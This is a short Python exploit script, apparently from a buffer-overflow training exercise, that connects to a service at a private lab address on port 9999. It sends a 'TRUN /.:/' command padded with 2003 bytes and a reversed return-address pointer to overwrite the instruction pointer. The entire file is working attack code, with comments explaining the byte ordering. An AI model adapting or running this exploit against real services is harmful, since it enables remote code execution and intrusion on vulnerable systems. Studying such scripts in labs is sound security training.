#!/usr/bin/python3
import sys, socket

rhost = "192.168.10.6"
rport = 9999

## Pointer: 0x625011af. Will need to enter the bytes in reverse order 
## x86 architecture stores low-order bytes in lowest address
## and high-order bytes in highest address

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost, rport))
    
    s.send((b'TRUN /.:/' + shellcode))
    s.close()
    
except:
    print ("Error connecting to the server.")
    sys.exit()
